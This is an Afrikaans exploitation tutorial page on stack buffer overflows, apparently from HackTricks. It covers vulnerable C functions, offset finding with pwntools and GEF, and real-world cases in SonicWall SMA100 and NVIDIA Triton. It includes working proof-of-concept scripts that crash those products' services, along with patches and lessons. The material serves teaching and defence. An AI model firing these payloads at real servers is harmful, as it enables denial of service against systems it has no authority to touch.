# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Wat is 'n Stack Overflow

'n **stack overflow** is 'n kwesbaarheid wat voorkom wanneer 'n program meer data na die stapel skryf as wat dit toegeken is om te hou. Hierdie oortollige data sal **aangrensende geheue ruimte oorskryf**, wat lei tot die korrupsie van geldige data, onderbreking van die beheerstroom, en moontlik die uitvoering van kwaadwillige kode. Hierdie probleem ontstaan dikwels as gevolg van die gebruik van onveilige funksies wat nie grensekontrole op invoer uitvoer nie.

Die hoofprobleem van hierdie oorskrywing is dat die **gestoor instruksie-aanwyser (EIP/RIP)** en die **gestoor basisaanwyser (EBP/RBP)** om na die vorige funksie terug te keer, **op die stapel gestoor word**. Daarom sal 'n aanvaller in staat wees om dit te oorskryf en **die uitvoeringsvloei van die program te beheer**.

Die kwesbaarheid ontstaan gewoonlik omdat 'n funksie **meer bytes binne die stapel kopieer as die hoeveelheid wat daarvoor toegeken is**, en dus in staat is om ander dele van die stapel te oorskryf.

Sommige algemene funksies wat kwesbaar is hiervoor, is: **`strcpy`, `strcat`, `sprintf`, `gets`**... Ook, funksies soos **`fgets`**, **`read` & `memcpy`** wat 'n **lengte argument** neem, kan op 'n kwesbare manier gebruik word as die gespesifiseerde lengte groter is as die toegeken. 

Byvoorbeeld, die volgende funksies kan kwesbaar wees:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Vind van Stap Oorloop verskuiwings

Die mees algemene manier om stap oorloop te vind, is om 'n baie groot invoer van `A`s te gee (bv. `python3 -c 'print("A"*1000)'`) en 'n `Segmentation Fault` te verwag wat aandui dat die **adres `0x41414141` probeer is om toegang te verkry**.

Boonop, sodra jy gevind het dat daar 'n Stap Oorloop kwesbaarheid is, sal jy die verskuiwing moet vind totdat dit moontlik is om die **terugadres te oorskry**, hiervoor word gewoonlik 'n **De Bruijn-sekwensie** gebruik. Wat vir 'n gegewe alfabet van grootte _k_ en subreekse van lengte _n_ 'n **sikliese sekwensie is waarin elke moontlike subreeks van lengte _n_ presies een keer verskyn** as 'n aaneengeskakelde subreeks.

Op hierdie manier, in plaas daarvan om handmatig uit te vind watter verskuiwing nodig is om die EIP te beheer, is dit moontlik om een van hierdie sekwensies as opvulling te gebruik en dan die verskuiwing van die bytes wat dit oorgeskryf het, te vind.

Dit is moontlik om **pwntools** hiervoor te gebruik:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
of **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Exploiting Stack Overflows

Tydens 'n oorgang (as die oorganggrootte groot genoeg is) sal jy in staat wees om **te oorskryf** waardes van plaaslike veranderlikes binne die stapel totdat jy die gestoor **EBP/RBP en EIP/RIP (of selfs meer)** bereik.\
Die mees algemene manier om hierdie tipe kwesbaarheid te misbruik, is deur die **terugadres te wysig** sodat wanneer die funksie eindig, die **beheer vloei na die plek waar die gebruiker gespesifiseer het** in hierdie pointer.

E however, in ander scenario's mag dit net **om te oorskryf van sommige veranderlikes waardes in die stapel** genoeg wees vir die uitbuiting (soos in maklike CTF-uitdagings).

### Ret2win

In hierdie tipe CTF-uitdagings, is daar 'n **funksie** **binne** die binêre wat **nooit aangeroep word** en wat **jy moet aanroep om te wen**. Vir hierdie uitdagings moet jy net die **offset vind om die terugadres te oorskryf** en **die adres van die funksie** vind om aan te roep (gewoonlik [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) sal gedeaktiveer wees) sodat wanneer die kwesbare funksie terugkeer, die verborge funksie aangeroep sal word:

{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

In hierdie scenario kan die aanvaller 'n shellcode in die stapel plaas en die beheerde EIP/RIP misbruik om na die shellcode te spring en arbitrêre kode uit te voer:

{{#ref}}
stack-shellcode/
{{#endref}}

### ROP & Ret2... tegnieke

Hierdie tegniek is die fundamentele raamwerk om die hoofbeskerming van die vorige tegniek te omseil: **Geen uitvoerbare stapel (NX)**. En dit stel in staat om verskeie ander tegnieke uit te voer (ret2lib, ret2syscall...) wat sal eindig met die uitvoering van arbitrêre opdragte deur bestaande instruksies in die binêre te misbruik:

{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

'n Oorgang is nie altyd in die stapel nie, dit kan ook in die **heap** wees byvoorbeeld:

{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Types of protections

Daar is verskeie beskermings wat probeer om die uitbuiting van kwesbaarhede te voorkom, kyk daarna in:

{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

'n Goeie demonstrasie van waarom **`sscanf` nooit vertrou moet word vir die ontleding van onbetroubare invoer** het in 2025 in SonicWall se SMA100 SSL-VPN toestel verskyn. Die kwesbare roetine binne `/usr/src/EasyAccess/bin/httpd` probeer om die weergawe en eindpunt uit enige URI wat met `/__api__/` begin te onttrek:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. Die eerste konversie (`%2s`) stoor veilig **twee** bytes in `version` (bv. `"v1"`).
2. Die tweede konversie (`%s`) **het geen lengte spesifiseerder nie**, daarom sal `sscanf` aanhou kopieer **tot die eerste NUL byte**.
3. Omdat `endpoint` op die **stack** geleë is en **0x800 bytes** lank is, sal die verskaffing van 'n pad langer as 0x800 bytes alles wat na die buffer sit, korrupteer ‑ insluitend die **stack canary** en die **gestoor terugadres**.

'n Enkellyn bewys-van-konsep is genoeg om die krag te aktiveer **voor outentisering**:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Alhoewel stapelkanaries die proses beëindig, verkry 'n aanvaller steeds 'n **Denial-of-Service** primitief (en, met addisionele inligtingslekke, moontlik kode-uitvoering). Die les is eenvoudig:

* Verskaf altyd 'n **maksimum veldwydte** (bv. `%511s`).
* Verkies veiliger alternatiewe soos `snprintf`/`strncpy_s`.

### Werklike Voorbeeld: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA se Triton Inference Server (≤ v25.06) het verskeie **stapel-gebaseerde oorgange** bevat wat deur sy HTTP API bereik kon word. Die kwesbare patroon het herhaaldelik in `http_server.cc` en `sagemaker_server.cc` verskyn:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) gee die **aantal interne buffersegmenten** wat die huidige HTTP-versoekliggaam saamstel.
2. Elke segment veroorsaak dat 'n **16-byte** `evbuffer_iovec` op die **stapel** toegeken word via `alloca()` – **sonder enige boonste grens**.
3. Deur **HTTP _chunked transfer-encoding_** te misbruik, kan 'n kliënt die versoek dwing om in **honderde duisende 6-byte stukke** (`"1\r\nA\r\n"`) gesplit te word. Dit laat `n` onbeperk groei totdat die stapel uitgeput is.

#### Bewys-van-Konsep (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
'n ~3 MB versoek is genoeg om die gestoor terugadres te oorskryf en **crash** die daemon op 'n standaard bou.

#### Patch & Mitigering
Die 25.07 vrystelling vervang die onveilige stapeltoewysing met 'n **heap-ondersteunde `std::vector`** en hanteer `std::bad_alloc` met genade:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Lessons geleer:
* Nooit `alloca()` aanroep met aanvaller-beheerde groottes nie.
* Gekapte versoeke kan drasties die vorm van bediener-kant buffers verander.
* Valideer / beperk enige waarde wat uit kliëntinvoer afgelei is *voor* dit in geheue toewysings gebruik word.

## Verwysings
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)

{{#include ../../banners/hacktricks-training.md}}
